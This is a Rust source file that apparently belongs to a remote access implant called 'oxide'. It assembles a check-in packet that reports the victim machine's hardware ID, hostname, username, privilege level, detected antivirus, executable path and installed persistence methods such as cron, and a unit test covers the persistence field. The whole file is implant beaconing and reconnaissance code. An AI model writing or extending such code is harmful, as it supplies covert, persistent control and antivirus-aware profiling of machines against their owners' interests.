use crate::persistence::PersistenceStatus;
use crate::platform;
use oxide_shared::packet::Packet;

pub fn build_checkin_packet(persistence_status: &[PersistenceStatus]) -> Packet {
    let info = platform::gather_system_info();
    Packet::new(
        "checkin",
        serde_json::json!({
            "hwid": info.hwid,
            "hostname": info.hostname,
            "os": info.os,
            "arch": info.arch,
            "username": info.username,
            "privileges": info.privileges,
            "av": info.av,
            "exe_path": info.exe_path,
            "version": oxide_shared::constants::VERSION,
            "persistence": persistence_status.iter().map(|s| serde_json::json!({
                "method": s.name,
                "installed": s.installed,
            })).collect::<Vec<_>>(),
        }),
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::persistence::PersistenceStatus;

    #[test]
    fn checkin_includes_persistence_field() {
        let status = vec![PersistenceStatus {
            name: "cron",
            installed: true,
            error: None,
        }];
        let pkt = build_checkin_packet(&status);
        assert_eq!(pkt.packet_type, "checkin");
        assert!(pkt.data["persistence"].is_array());
        assert_eq!(pkt.data["persistence"][0]["method"], "cron");
        assert_eq!(pkt.data["persistence"][0]["installed"], true);
    }
}
